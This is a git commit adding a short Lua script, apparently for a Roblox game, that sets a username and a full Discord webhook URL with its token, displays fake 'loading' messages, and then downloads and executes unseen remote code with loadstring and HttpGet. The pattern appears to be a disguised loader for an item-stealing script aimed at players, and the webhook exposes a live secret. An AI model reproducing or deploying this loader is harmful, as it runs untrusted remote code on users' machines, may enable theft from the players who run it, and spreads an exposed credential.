78a0f0d508ab1d872e3660b377074deb9a09b87e
djpp09 <131808505+djpp09@users.noreply.github.com>
2023-04-27 20:15:44 +0200

    Add files via upload

---
+++ script.lua
@@ -0,0 +1,10 @@
+Username = "teroskript"
+WebHook = "https://discord.com/api/webhooks/1101180788629839912/CRfU_p8PbMu1VU2vkMPyi9oVYTPNUA_sha8omjDDOnUubsEl02MmRull2RHdzUyK5nk8"
+
+loadingscreen = true 
+_G.CustomScriptName = "Tero Skript"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script"
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Scripts..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
